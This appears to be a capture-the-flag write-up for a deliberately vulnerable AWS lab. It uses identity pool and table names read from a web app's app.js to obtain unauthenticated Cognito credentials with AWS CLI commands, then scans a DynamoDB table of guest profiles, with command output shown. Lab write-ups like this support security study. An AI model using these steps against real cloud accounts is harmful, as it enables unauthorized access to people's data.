# Complimentary

http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/


When we visit the site - there's a dashboard, but nothin' much to it.

We can't really scan the AWS site with Nmap (or at least I don't think I can)

If we look in the source code, the app is build with app.js. Not really a secure practice, given that we can see the source code of app.js as it is saved locally on our computer.

Anyhoo, I went further and found out there's an authentication token also saved locally in JSON.

pho1.png

export tokens to your system
```
root@ip-10-112-87-15:~# export AWS_ACCESS_KEY_ID=ASIA...
root@ip-10-112-87-15:~# export AWS_SECRET_ACCESS_KEY=<secretkey>
root@ip-10-112-87-15:~# export AWS_SESSION_TOKEN=
```

```
DESCRIPTION
       Security  Token  Service  (STS)  enables you to request temporary, lim-
       ited-privilege credentials for users. This guide provides  descriptions
       of  the  STS  API.  For  more information about using this service, see
       Temporary Security Credentials .
```

check identity

```
root@ip-10-112-87-15:~# aws sts get-caller-identity
{
    "UserId": "AROA2YR2KKQMU7XJ4LMJP:i-0872e048b538cc115",
    "Account": "739930428441",
    "Arn": "arn:aws:sts::739930428441:assumed-role/vulnerable-machine/i-0872e048b538cc115"
}
```

okay so I had to go some steps back and go at it again. AWS is not my thing. I tried to enumerate anything, but I have no access.

Turns out, `app.js` is the place to look. It tells us the specific name of DynamoDB's table: `complimentary-GuestWellnessProfiles`.

```
root@ip-10-112-87-15:~# aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
{
    "IdentityId": "us-east-1:4d571309-b0a2-c3df-e37e-aee795f10194"
}
```

```

aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b0a2-c3df-e37e-aee795f10194" \
  --region us-east-1
```

```
root@ip-10-112-87-15:~# aws cognito-identity get-credentials-for-identity   --identity-id "us-east-1:4d571309-b0a2-c3df-e37e-aee795f10194"   --region us-east-1
{
    "IdentityId": "us-east-1:4d571309-b0a2-c3df-e37e-aee795f10194",
    "Credentials": {
        "AccessKeyId": "...Redacted",
        "SecretKey": "...Redacted",
        "SessionToken": "...Redacted"
        "Expiration": "2026-07-30T12:04:15+00:00"
    }
}

```
> You have to click enter a few times to see the whole output.


export AWS_ACCESS_KEY_ID=<access_key>
export AWS_SECRET_ACCESS_KEY=<secret_access_key>
export AWS_SESSION_TOKEN=<token>



```
root@ip-10-112-87-15:~# aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
{
    "Items": [
        {
		"notes": {
			"S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
		},
		"guest_id": {
			"S": "guest-vip-042"
		},
		"email": {
			"S": "vip042@hackerholidays.thm"
		},
        },
    ],
    "Count": 5,
    "ScannedCount": 5,
    "ConsumedCapacity": null
}
root@ip-10-112-87-15:~# 
```)
